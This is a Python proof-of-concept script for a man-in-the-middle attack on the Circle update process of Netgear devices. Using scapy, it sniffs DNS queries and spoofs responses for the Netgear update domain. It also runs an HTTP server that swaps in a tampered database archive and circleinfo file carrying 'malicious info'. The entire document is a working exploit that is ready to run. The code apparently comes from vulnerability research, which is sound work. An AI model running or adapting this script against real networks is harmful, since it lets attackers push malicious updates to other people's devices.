#!/usr/bin/env python

from multiprocessing import Process
from time import sleep
import argparse
import http.server
import re
import socketserver
import socket

from scapy.all import *


def build_dns_response(query, name):
    ip = query[IP]
    udp = query[UDP]
    dns = query[DNS]

    dns_answer = DNSRR(rrname=name, type='A', rclass='IN', ttl=5, rdata=server_ip)

    response = IP(src=ip.dst, dst=ip.src)
    response /= UDP(sport=udp.dport, dport=udp.sport)
    response /= DNS(id=dns.id, qr=1, aa=0, qdcount=1, ancount=1, qd=dns.qd, an=dns_answer)

    return response


def parse_dns_query(pkt):
    if DNSRR in pkt:
        name = pkt[DNSRR].rrname.decode('UTF-8', errors='backslashreplace')
        print(f'DNS Response for "{name}" from {pkt[IP].src}')

    elif DNSQR in pkt:
        name = pkt[DNSQR].qname.decode('UTF-8', errors='backslashreplace')
        print(f'DNS Query for "{name}" from {pkt[IP].src}')
        for update_domain in update_domains:
            if name.startswith(update_domain):
                dns_response = build_dns_response(pkt, name)
                send(dns_response, iface=sniff_iface)
                print(f'[+] Target DNS Query responded to with {server_ip}')


def udp_callback(pkt):
    if IP not in pkt or UDP not in pkt:
        return
    udp = pkt[UDP]
    try:
        if udp.dport == 53 or udp.sport == 53:
            parse_dns_query(pkt)
    except Exception as e:
        print(f'[!] Packet caused exception: {str(e)}')
        print(f'    {pkt.summary()}')


class CustomHttpRequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        # strip extra params for pattern matching
        if '?' in self.path:
            path = self.path[:self.path.find('?')]
        else:
            path = self.path
        if path.endswith('database.tar.gz'):
            # serve our copy of the circleinfo.txt file with the malicious info
            self.path = './database_pwn.tar.gz'
            return http.server.SimpleHTTPRequestHandler.do_GET(self)
        elif path.endswith('circleinfo.txt'):
            # serve our copy of the circleinfo.txt file with the malicious info
            self.path = './circleinfo_pwn.txt'
            return http.server.SimpleHTTPRequestHandler.do_GET(self)
        else:
            # Respond to all other requests with a 404
            self.send_response(404)
            self.end_headers()
            return

def serve_http_thread(server_ip, http_port):
    http_address = (server_ip, http_port)
    custom_http_server = socketserver.TCPServer(http_address, CustomHttpRequestHandler)

    print(f'Serving HTTP at {server_ip} on port {http_port}...')
    try:
        while True:
            custom_http_server.handle_request()
    except KeyboardInterrupt:
        pass
    print('HTTP server stopped.')

if __name__ == "__main__":
    parser = argparse.ArgumentParser('upgrade_attack.py', description='Proof of concept MitM on Circle upgrade')
    parser.add_argument('interface', help='Interface to sniff/send on')
    parser.add_argument('ip_address', help='IP to serve fake update on')

    args = parser.parse_args()
    sniff_iface = args.interface
    server_ip = args.ip_address
    http_port = 80
    
    # The typical update domains
    update_domains = ['http.updates1.netgear.com']

    http_child = Process(target=serve_http_thread, args=(server_ip, http_port))
    http_child.start()
    # Let the HTTP server start up first
    sleep(1)
    if not http_child.is_alive():
        print('Error: HTTP server failed to start correctly, quitting...')
        exit(-1)

    # Removes extra scapy logging on send()
    conf.verb = False
    print(f'Sniffing for upgrade traffic on interface {sniff_iface}, Press CTRL+C to stop...')
    try:
        sniff(iface=sniff_iface, prn=udp_callback, filter="udp", store=False)
    except Scapy_Exception as e:
        print(f'Scapy Exception occurred: {str(e)}')
        print(f'Error: Sniffing failed, check you\'re on the right interface and run with sudo.')

    http_child.terminate()
    http_child.join()

    print('Done.')

